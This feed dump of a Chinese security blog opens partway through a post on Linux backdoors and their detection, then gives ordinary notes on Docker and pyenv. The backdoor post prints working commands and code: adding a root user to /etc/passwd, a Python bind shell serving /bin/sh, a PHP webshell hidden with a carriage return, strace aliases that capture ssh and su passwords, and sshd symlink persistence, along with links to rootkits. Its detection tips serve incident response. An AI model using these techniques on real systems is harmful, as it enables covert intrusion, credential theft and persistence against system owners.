<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;backdoor:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash&quot;&gt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2019/02/16/linux常见backdoor及排查技术/passwdbackdoor.png" alt=""></p>
<ul>
<li>注意当我们拥有一个命令执行漏洞或写文件漏洞且为root权限，这个时候就可以通过这种方法直接添加用户。</li>
<li>优点：简单</li>
<li>缺点：易被检测到</li>
<li>排查：检查/etc/passwd文件是否有异常<h3 id="nologin后门"><a href="#nologin后门" class="headerlink" title="nologin后门"></a>nologin后门</h3></li>
<li>目前在其它的文章中还没有看到过，自己想出来的，就是将nologin程序替换为bash，很多时候应急人员查看passwd，发现账户对应的shell为nologin认为就是系统的账号且这个账号是不能远程登陆的或者是登陆之后没有shell的，可能就认为这个账号是安全的，所以我们就可以将nologin设置成bash，并且修改这个账号的密码，如系统自带的backup账号就是一个很好用账户<br><img src="/2019/02/16/linux常见backdoor及排查技术/passwd.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/bash.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/login.png" alt=""></li>
<li>优点：简单</li>
<li>缺点：暂无</li>
<li>排查：检查nologin是否被替换<h3 id="认证公钥后门"><a href="#认证公钥后门" class="headerlink" title="认证公钥后门"></a>认证公钥后门</h3></li>
<li>打过redis未授权漏洞的应该都知道里面有一种利用方式就是向服务器authoriezd_keys文件里面写入自己电脑的公钥，这个时候就可以实现免密码登陆。</li>
<li>优点：简单</li>
<li>缺点：不太隐蔽</li>
<li><p>排查：检查每个用户根目录下面authorized_keys文件是否添加了异常了的公钥。</p>
<h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#enter the mal script directory 、execute the script and then remove the script</span><br><span class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">        server=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">        server.bind((&apos;0.0.0.0&apos;,11))</span><br><span class="line">        server.listen(5)</span><br><span class="line">        print &apos;waiting for connect&apos;</span><br><span class="line">        talk, addr = server.accept()</span><br><span class="line">        print &apos;connect from&apos;,addr</span><br><span class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</span><br><span class="line">                stdout=talk, stderr=talk, shell=True)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2019/02/16/linux常见backdoor及排查技术/vimversion.png" alt=""></p>
<ul>
<li>优点：通过查看/proc/<code>pid</code>/cmdline查看不到具体执行了什么命令或恶意脚本。</li>
<li>缺点：仍可以看到有vim进程</li>
<li>排查：检测对应vim进程号虚拟目录的map文件是否有python字眼。<br><img src="/2019/02/16/linux常见backdoor及排查技术/vimbackdoor.png" alt=""></li>
<li>参考文章<a href="https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf" target="_blank" rel="noopener">Weapons of Text Destruction.</a><h3 id="python内存端口监听"><a href="#python内存端口监听" class="headerlink" title="python内存端口监听"></a>python内存端口监听</h3>参考<a href="https://gist.github.com/epinna/8ce25ac36a7710cdd1806764c647cf99" target="_blank" rel="noopener">epinna’s hacked up in-memory Python bindshell.</a></li>
<li>注意在原脚本基础上可以加上os.setuid(0)，并给python加上suid可以得到root权限的shell <a href="https://threat.tevora.com/a-valiant-effort-at-a-stealthy-backdoor-2/" target="_blank" rel="noopener">ref</a>，此外如果有web服务器，可以在需要的时候才开启端口监听防止端口一直监听被发现，比较stealthy，可参考<a href="https://blog.sevagas.com/HTTP-backdoor-using-POSIX-file-capabilities-and-PHP" target="_blank" rel="noopener">HTTP backdoor using POSIX file capabilities and PHP</a><h3 id="终端解析-r导致的问题"><a href="#终端解析-r导致的问题" class="headerlink" title="终端解析\r导致的问题"></a>终端解析\r导致的问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?=\`\$_POST[good]\`?&gt;\r&lt;?=&apos;PHP Test Page &gt;||&lt;                  &apos;;?&gt;&quot; &gt;/var/www/html/test.php</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2019/02/16/linux常见backdoor及排查技术/echo.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/terminal.png" alt=""></p>
<ul>
<li>优点：通过终端命令例如cat、more等命令查看不到恶意代码,适合隐藏一句话木马。</li>
<li>缺点：易被检测，只是通过终端命令查看的时候看不到恶意代码，而通过其它读文件操作或者通过vim编辑的时候仍可以查看恶意代码。</li>
<li>排查：使用编辑器或者一般的webshell扫描工具即可检测。<h3 id="一些命令导致截断的问题"><a href="#一些命令导致截断的问题" class="headerlink" title="一些命令导致截断的问题"></a>一些命令导致截断的问题</h3></li>
<li>在使用ps进行进程查看的时候，不知道很多人会不会遇到这种问题，命令很长被截断的问题，终端显示可能美观，会截断较长的命令，比如在使用docker ps -a查看container的时候，可能你的command列会显示不全，那么使用docker ps -a –no-trunc让其显示完全。同样在使用ps命令查看进程的时候，也存在这种问题。可以在其填充大量的空格进行截断，那么就可达到“进程隐藏”的效果。<br><img src="/2019/02/16/linux常见backdoor及排查技术/pscommand.png" alt=""></li>
<li>其中使用了<a href="https://github.com/chenkaie/junkcode/blob/master/xhide.c" target="_blank" rel="noopener">xhide工具</a>进行进程名的修改。</li>
<li>优点：简单</li>
<li>缺点：易被检测到</li>
<li>排查：通过ps -aux|grep 可疑进程的pid 即可显示完全，或者使用ps aux | less -+S、ps aux | cat或ps aux | most -w等命令进行查看。<h3 id="strace记录ssh登录密码"><a href="#strace记录ssh登录密码" class="headerlink" title="strace记录ssh登录密码"></a>strace记录ssh登录密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \</span><br><span class="line"> -e read,write,connect  -s2048 ssh&apos;  </span><br><span class="line">也可记录 su密码 su=&apos;strace   -o   /tmp/sshpwd-`date    &apos;+%d%h%m%s&apos;`.log  \</span><br><span class="line"> -e read,write,connect  -s2048 su&apos;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2019/02/16/linux常见backdoor及排查技术/sshkeyloger.png" alt=""></p>
<ul>
<li>优点：改动较小</li>
<li>缺点：易被检测到</li>
<li>排查：通过排查shell的配置文件或者alias命令即可发现，例如~/.bashrc和~/.bash_profile文件查看是否有恶意的alias问题。(注意bash_profile是在登录shell执行的，bashrc是在非登录shell执行,即如果你只是想每次在登录的时候让它去执行，这个时候你可以把你的命令写在.bash_profile,如果你想每次打开一个新的终端的时候都去执行，那么应该把命令写在.bashrc中)<h3 id="ssh连接监控"><a href="#ssh连接监控" class="headerlink" title="ssh连接监控"></a>ssh连接监控</h3></li>
<li>这个后门可以用来监控连接到服务器上的客户端所进行的所有操作，也可进行记录和重放，但是需要当前有用户通过ssh登录<br>详细见<a href="https://github.com/nopernik/SSHPry2.0" target="_blank" rel="noopener">SSHPry2</a></li>
<li>优点：简单且类似录屏清晰记录操作过程</li>
<li>缺点：没有做进程隐藏，如果能够结合一些进程隐藏的技巧将会很好用。</li>
<li>排查：主要是进程排查<h3 id="常见sshd后门"><a href="#常见sshd后门" class="headerlink" title="常见sshd后门"></a>常见sshd后门</h3></li>
<li><p>一种是建立sshd的软连接方法，开启其它的端口例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /home/su</span><br><span class="line">/home/su -oport=2222</span><br></pre></td></tr></table></figure>
</li>
<li><p>优点：简单</p>
</li>
<li>缺点：易被检测到</li>
<li>排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。<br><img src="/2019/02/16/linux常见backdoor及排查技术/lssshd.png" alt=""></li>
<li><a href="https://mp.weixin.qq.com/s/clSHwC9ZNF_FXEF0ZDAawA" target="_blank" rel="noopener">参考链接-SSH软链接后门利用和原理</a></li>
<li>另外一种就是通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。</li>
<li>优点：隐蔽性较好</li>
<li>缺点：暂无</li>
<li>排查：这种sshd后门一般可能会有一定的特征，可以通过strings sshd |egrep ‘\d{1,3}.\d{1,3}.‘或者通过strace 查看是否有可疑的写文件操作。</li>
<li>此外还有一种给openssh打补丁的方式添加ssh后门的方法，具体见<a href="https://www.cnblogs.com/bigdevilking/p/9535427.html" target="_blank" rel="noopener">利用Openssh后门 劫持root密码</a><h3 id="定时任务和开机启动项"><a href="#定时任务和开机启动项" class="headerlink" title="定时任务和开机启动项"></a>定时任务和开机启动项</h3></li>
<li>一般的挖矿木马喜欢设置定时任务来进行驻留或者进行分时段的挖矿。<br><img src="/2019/02/16/linux常见backdoor及排查技术/crontab.png" alt=""></li>
<li>排查：一般通过crontab -l命令即可检测到定时任务后门。不同的linux发行版可能查看开机启动项的文件不大相同，Debian系linux系统一般是通过查看/etc/init.d目录有无最近修改和异常的开机启动项。而Redhat系的linux系统一般是查看/etc/rc.d/init.d或者/etc/systemd/system等目录。<br><img src="/2019/02/16/linux常见backdoor及排查技术/init.png" alt=""><h3 id="预加载型动态链接库后门-ld-so-preload"><a href="#预加载型动态链接库后门-ld-so-preload" class="headerlink" title="预加载型动态链接库后门 ld.so.preload"></a>预加载型动态链接库后门 ld.so.preload</h3></li>
<li>可能有些人不太了解，简单说一下，就是我们在linux下执行某个可执行文件之前，系统会预先加载用户定义的动态链接库的一种技术，这个技术可以重写系统的库函数，导致发生Hijack。<br><img src="/2019/02/16/linux常见backdoor及排查技术/strace.png" alt=""></li>
<li>如上图所示，strace 命令id的时候可以发现有预先去读取/etc/ld.so.preload文件(也可使用设置LD_PRELAOD环境变量方式)，如果我们将我们事先写好的恶意so文件位置写入ld.so.preload文件，这时就会达到劫持的效果。</li>
<li>比较好用的工具是Vegile和cub3<br><a href="https://github.com/Screetsec/Vegile/blob/master/Vegile#L112" target="_blank" rel="noopener">Vegile</a><br><a href="https://github.com/mempodippy/cub3" target="_blank" rel="noopener">cub3</a>,这个工具使用了LD_PRELOAD和系统的扩展属性去隐藏文件。</li>
<li>更多参考：<br><a href="http://www.drupal001.com/2013/02/linux-extended-attributes/" target="_blank" rel="noopener">Linux文件系统扩展属性</a></li>
<li>其中还有一种是通过修改动态链接器来加载恶意动态链接库的后门，通过替换或者修改动态链接器中的默认预加载配置文件/etc/ld.so.preload路径的rootkit，此方法更加隐蔽，这个方法的较成熟的利用工具是Vlany，github地址<a href="https://github.com/mempodippy/vlany" target="_blank" rel="noopener">https://github.com/mempodippy/vlany</a><br><a href="https://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">警惕利用Linux预加载型恶意动态链接库的后门</a></li>
<li>优点：可以隐藏文件、网络、进程等。相对于普通用户空间rootkit而言，隐藏性较好，相对于内核模块rootkit来说，兼容性更好，编写难道低</li>
<li>缺点：暂无</li>
<li>排查：通过strace命令去跟踪预加载的文件是否为/etc/ld.so.preload，以及文件中是否有异常的动态链接库。以及检查是否设置LD_PRELOAD环境变量等。注意：在进行应急响应的时候有可能系统命令被替换或者关键系统函数被劫持（例如通过预加载型动态链接库后门），导致系统命令执行不正常，这个时候可以下载busybox。下载编译好的对应平台版本的busybox，或者下载源码进行编译通过U盘拷贝到系统上，因为busybox是静态编译的，不依赖于系统的动态链接库，busybox的使用类似如下 busybox ls，busybox ps -a。<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3></li>
<li>使用ptrace向进程中注入恶意so文件工具linux-inject，<a href="https://github.com/gaffe23/linux-inject/" target="_blank" rel="noopener">github地址</a><br><img src="/2019/02/16/linux常见backdoor及排查技术/processinject.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/evilso.png" alt=""></li>
<li>优点：隐藏性好</li>
<li>缺点：编写难度高，可能会有兼容性、被注入进程down掉等问题</li>
<li>排查：很难<h3 id="内核级rootkit"><a href="#内核级rootkit" class="headerlink" title="内核级rootkit"></a>内核级rootkit</h3></li>
<li>内核级的rootkit也很多，这里简单推荐一个Diamorphine<br><img src="/2019/02/16/linux常见backdoor及排查技术/lkm.png" alt=""><br><a href="https://github.com/m0nad/Diamorphine" target="_blank" rel="noopener">github地址</a></li>
<li>优点：隐藏性较好</li>
<li>缺点：编写难度有点儿高</li>
<li>排查：可以通过unhide等工具进行排查<br><img src="/2019/02/16/linux常见backdoor及排查技术/unhide.png" alt=""></li>
<li>此外还有<a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">Reptile工具</a></li>
<li><a href="https://github.com/milabs/awesome-linux-rootkits" target="_blank" rel="noopener">awesome-linux-rootkits</a><h3 id="软件后门"><a href="#软件后门" class="headerlink" title="软件后门"></a>软件后门</h3></li>
<li>除了系统后门，还有针对一些常用软件的后门，比如apache服务器后门</li>
<li><a href="https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor" target="_blank" rel="noopener">A Backdoor For Apache HTTP Server Written in C</a></li>
<li><a href="https://forum.90sec.com/t/topic/342" target="_blank" rel="noopener">从零开始打造一款简单的apache module后门</a></li>
<li><a href="https://github.com/VladRico/apache2_BackdoorMod" target="_blank" rel="noopener">apache2_BackdoorMod</a><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2></li>
<li>以上介绍了几种backdoor的技巧，只是抛砖引玉，希望有更多人分享你的linux backdoor技巧、Write your own backdoor and MAKE BACKDOOR GREAT AGAIN : ）<br><img src="/2019/02/16/linux常见backdoor及排查技术/guli.jpg" alt=""><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><a href="https://attack.mitre.org/techniques/T1156/" target="_blank" rel="noopener">ATT&amp;CK Persistence</a><br><a href="https://nnc3.com/mags/LM10/Magazine/Archive/2007/77/022-028_backdoors/article.html" target="_blank" rel="noopener">Techniques for building a hidden backdoor</a><br><a href="https://github.com/d30sa1/RootKits-List-Download" target="_blank" rel="noopener">linux rootkits</a><br><a href="https://github.com/mfontanini/Programs-Scripts/" target="_blank" rel="noopener">https://github.com/mfontanini/Programs-Scripts/</a><br><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">Reptile</a><br><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">icmpsh</a><br><a href="https://isec.ne.jp/wp-content/uploads/2017/11/74LKM-rootkits-1.pdf" target="_blank" rel="noopener">Diamorphine</a><br><a href="https://github.com/CoolerVoid/HiddenWall" target="_blank" rel="noopener">HiddenWall</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>笔记之docker的使用</title>
    <link href="http://kevien.github.io/2018/09/26/%E7%AC%94%E8%AE%B0%E4%B9%8Bdocker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://kevien.github.io/2018/09/26/笔记之docker的使用/</id>
    <published>2018-09-26T06:19:25.000Z</published>
    <updated>2024-01-12T07:45:54.307Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2018/09/26/笔记之docker的使用/docker-friends.png" alt=""></p>
<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>好久没有更新了，主要比较忙：(   以前只是简单的使用，前段时间相对较”近距离”接触了下docker，发现用来搭建漏洞环境真的很方便。尤其是Dockerfile和docker-compose分别用来构建定制镜像和管理多个容器的功能让我非常惊讶，当然期间也踩了一些坑，把这些坑记录一下。<h4 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h4></li>
<li>什么是docker，docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。<br><img src="/2018/09/26/笔记之docker的使用/itdevelop.png" alt=""></li>
<li>如上图所示计算机的发展经历了从物理机到虚拟机的过程，最后出现了共享底层OS的容器。</li>
<li>docker里面有两个概念需要稍微理解一下，Image(镜像)和Container(容器)，他们两个的关系就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。</li>
<li><a href="https://github.com/widuu/chinese_docker/blob/master/installation/mac.md" target="_blank" rel="noopener">Docker在Mac上的基本安装</a><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#镜像操作常用命令</span><br><span class="line">docker images    #查看当前的镜像</span><br><span class="line">docker search xxx   #查找xxx镜像</span><br><span class="line">docker push/pull xxx     #获取xxx镜像 默认是latest</span><br><span class="line">docker inspect image    #查看镜像的相关信息  主要要加上image的TAG</span><br><span class="line">docker commit  #更新镜像 –m:提交的描述信息 –a :指定镜像作者</span><br><span class="line">docker build  #从零开始构建一个新的镜像，需要创建Dockerfile文件来包含一组指令来告诉docker如何构建我们的镜像。</span><br><span class="line">docker rmi $(docker images -q)   #删除所有镜像</span><br></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">容器操作常用命令</span><br><span class="line">docker ps  -a  #查看所有容器(包括已停止的)，--no-trunc 参数</span><br><span class="line">docker run –it  -name centos-test centos  /bin/bash  #启动容器</span><br><span class="line">docker attach/exec  #进入容器，推荐使用exec，因为此命令会退出容器终端，但不会导致容器的停止。</span><br><span class="line">docker inspect #查看docker的底层信息，记录容器的配置和状态等。</span><br><span class="line">docker start/stop/rm containerid #开始/停止/删除某个容器</span><br><span class="line">docker stop $(docker ps -aq) #停止所有容器</span><br><span class="line">Docker rm containerid #删除容器</span><br><span class="line">docker logs #查看容器内部的标准输出</span><br><span class="line">docker top #查看容器内部运行的进程</span><br><span class="line">docker-compose build --no-cache #每次构建的时候不使用cache 或者在写dockerfile的时候添加或者修改一条无关紧要的命令，这样也会强制build，而不使用cache</span><br><span class="line">docker stats #查看docker容器占用资源情况</span><br></pre></td></tr></table></figure>
<p>以上是常用的命令，还有就是跟着<a href="https://yeasy.gitbooks.io/docker_practice/introduction/why.html" target="_blank" rel="noopener">Docker — 从入门到实践</a>基本操作一下没什么问题。</p>
<h4 id="Tips-之Dockerfile和docker-compose"><a href="#Tips-之Dockerfile和docker-compose" class="headerlink" title="Tips 之Dockerfile和docker-compose"></a>Tips 之Dockerfile和docker-compose</h4><ul>
<li><p>docker-compose helloworld版</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dockerfile</span><br><span class="line">FROM centos:centos7</span><br><span class="line">CMD [&quot;/sbin/init&quot;]   //注意这里这个一定要有，否则docker-compose up -d 的时候会马上退出</span><br><span class="line"></span><br><span class="line">docker-compose.yml</span><br><span class="line">version: &apos;2&apos;</span><br><span class="line">services:</span><br><span class="line">  helloworld:</span><br><span class="line">    build: .</span><br><span class="line">    container_name: helloworld</span><br></pre></td></tr></table></figure>
</li>
<li><p>在一个docker-compose可以开启多个相同image的service,例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">version: &apos;2&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  c1:</span><br><span class="line">    image: centos:7</span><br><span class="line">    command: /usr/sbin/init</span><br><span class="line">  c2:</span><br><span class="line">    image: centos:7</span><br><span class="line">    command: /usr/sbin/init</span><br></pre></td></tr></table></figure>
</li>
<li><p>docker-compose.yml 中version的释义就是compose的高版本需要高版本的docker engine支持，docker engine版本可以通过docker version命令查看。具体的对版本表见下图<br><img src="/2018/09/26/笔记之docker的使用/docker-compose-version.png" alt=""></p>
</li>
<li>如果想要在docker中运行多个后台程序，比如apache的web服务和ssh的服务，可以使用supervisord。更多可以参考<a href="https://riptutorial.com/docker/example/14132/dockerfile-plus-supervisord-conf" target="_blank" rel="noopener">链接</a></li>
<li>在由phith0n维护的<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">vulhub</a>项目里有很多Dockerfile，覆盖了绝大部分常用应用，非常方便修改和使用。且设计比较合理，web代码基本都是通过挂载www目录的方式进行部署，调试和部署起来非常的方便，基本就是docker-compose bulid 和docker-compose up -d 两条命令的事儿。</li>
<li>把宿主机的一个目录挂载到容器中，当访问容器中的这个目录时，出现如下问题： ls: cannot open directory .: Permission denied 这个问题可以参考文章<a href="https://blog.csdn.net/CHENYUFENG1991/article/details/79842459" target="_blank" rel="noopener">docker挂载目录失败/权限拒绝 解决方案</a></li>
<li>有时候docker-compose up -d 的时候 容器马上exit，这个时候一般是启动出现了问题，可以通过 docker-compose up  或者docker-compose  —verbose up通过查看详细的输出信息定位具体是哪里出问题了。</li>
<li>在向docker中放shell脚本的时候 需要在外部添加可执行权限。</li>
<li>在开启容器的时候如果需要执行多个命令，而且多个命令如果是”阻塞”的，可以在docker-compose.yml 文件中写入ENTRYPOINT 例如[“/usr/local/bin/docker-entrypoint.sh”]，这样在容器启动的时候会自动的运行docker-entrypoint.sh shell脚本里面可以写你想要其运行的多条命令。</li>
<li>有些镜像或者外部的资源下载比较的慢，这个时候使用proxychains给终端挂上代理，或者把资源下载到本地，在Dockerfile里面使用COPY命令进行本地拷贝。再有就是有时候pip安装的python库的时候下载失败时候可以使用 pip install -r  $d/requirements.txt -i  <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple/</a> 来提高下载速度</li>
<li>在centos7可能会遇到Docker error IPv4 forwarding is disabled的问题，<a href="http://mbacchi.github.io/2017/09/29/docker-ipv4-forwarding-disabled.html" target="_blank" rel="noopener">参考链接</a></li>
<li>开始的时候不建议使用最精简的linux系统，不然你会发现怎么连个vi命令都没有，什么都还得需要 RUN 安装，比较麻烦。centos7 最小化安装之后，默认是没有 ifconfig,netstat等命令，可以直接使用 yum -y install net-tools 安装即可。</li>
<li>有时候在使用docker-compose up -d 报错 network <id> not found，网络找不见，这个时候可以加参数 –force-recreate 即  docker-compose up -d  –force-recreate</id></li>
<li>有时候mysql就是起不来，这个时候 使用docker volume list查看 然后删除数据就可以了，其它情况也是 全部删除，<a href="https://github.com/laradock/laradock/issues/421" target="_blank" rel="noopener">参考链接</a>，docker volume  rm 就可以删除对应的数据库了。</li>
<li>pull回来的镜像如果想修改其中的用户密码，可以在Dockerfile中写如下的命令 RUN echo “root:Docker!” | chpasswd或者RUN echo “Docker!” | passwd –stdin root 即修改root的密码为Docker！。<a href="https://stackoverflow.com/questions/28721699/root-password-inside-a-docker-container" target="_blank" rel="noopener">stackoverflow</a></li>
<li>在此记录一下，不知道是不是docker的一个bug，当我在虚拟机里面创建一个文件，并且通过chattr +i 赋予文件不可修改属性的时候，当你关闭容器，一般容器并不会主动保存，除非你主动打包成镜像，所以它会去删除这个文件以保持“镜像不变性质”(暂且先这么叫吧)，这个时候会去删除这个文件，因为设置了不可修改属性，这个时候就会报错，如下图所示.<br><img src="/2018/09/26/笔记之docker的使用/bug.png" alt=""></li>
<li>docker-compose时候报错 ERROR: invalid reference format,有可能是路径中包含中文所导致的</li>
<li>docker-compose时候报错 ERROR：could not find an available，non-overlapping IPv4 address pool among the defaults to assign to the netowrk，可能是你创建的网络达到了最大限制，可以使用docker network prune命令去删除一些不用的网络。</li>
<li><a href="https://www.cnblogs.com/kevingrace/p/9599988.html" target="_blank" rel="noopener">通过容器提交镜像（docker commit）以及推送镜像（docker push）笔记</a></li>
<li><a href="https://blog.csdn.net/shenghuiping2001/article/details/103713885" target="_blank" rel="noopener">docker push时即使账户密码正确也显示 [denied: requested access to the resource is denied]</a><h4 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h4></li>
<li>最后还是多写或多修改几个Dockerfile和docker-compose.yml实际去体验一下，你会发现用他们来搭建漏洞环境very棒 ；P</li>
<li>当然docker的应用不仅仅是搭建漏洞环境，技术也不仅仅有Dockerfile、docker-compose，还有更多与docker相关优秀的开源项目像是Kubernetes、CoreOS、Etcd项目等。<br><img src="/2018/09/26/笔记之docker的使用/guli.jpg" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/09/26/笔记之docker的使用/docker-friends.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;T
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python虚拟环境安装和使用</title>
    <link href="http://kevien.github.io/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <id>http://kevien.github.io/2018/07/15/python虚拟环境安装和使用/</id>
    <published>2018-07-15T05:30:41.000Z</published>
    <updated>2022-04-20T08:32:02.490Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>Mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三方包安装需要root权限可能导致的安全问题等，所有就有了python虚拟环境，这里主要记录一下笔者在安装和使用pyenv以及virtualenv过程。<h4 id="pyenv安装和使用"><a href="#pyenv安装和使用" class="headerlink" title="pyenv安装和使用"></a>pyenv安装和使用</h4></li>
<li><p>推荐使用brew安装pyenv </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Install Homebrew</span><br><span class="line">/usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; </span><br><span class="line"># Install pyenv</span><br><span class="line">brew install pyenv </span><br><span class="line"># Add pyenv initializer to shell startup script</span><br><span class="line"># ZSH USERS: use ~/.zshrc instead of ~/.bash_profile</span><br><span class="line"># LINUX USERS: use ~/.bashrc instead of ~/.bash_profile</span><br><span class="line">echo &apos;eval &quot;$(pyenv init -)&quot;&apos; &gt;&gt; ~/.bash_profile </span><br><span class="line"># Restart your shell for changes to take effect</span><br><span class="line">exec $SHELL</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用pyenv install –list 查看可用的python版本</p>
</li>
<li>使用pyenv install  3.6.* 安装特定版本的python（建议安装个python2 和python3的环境即可）</li>
<li>查看已安装的版本 pyenv versions<br><img src="/2018/07/15/python虚拟环境安装和使用/pyenvversions.png" alt=""></li>
<li>python环境切换 使用pyenv global xxx 或者pyenv local ,其中前者是全局的设置，而后者是针对当前项目python环境的设置,还可以使用pyenv shell xxx 设置当前shell的python版本，退出shell后失效。</li>
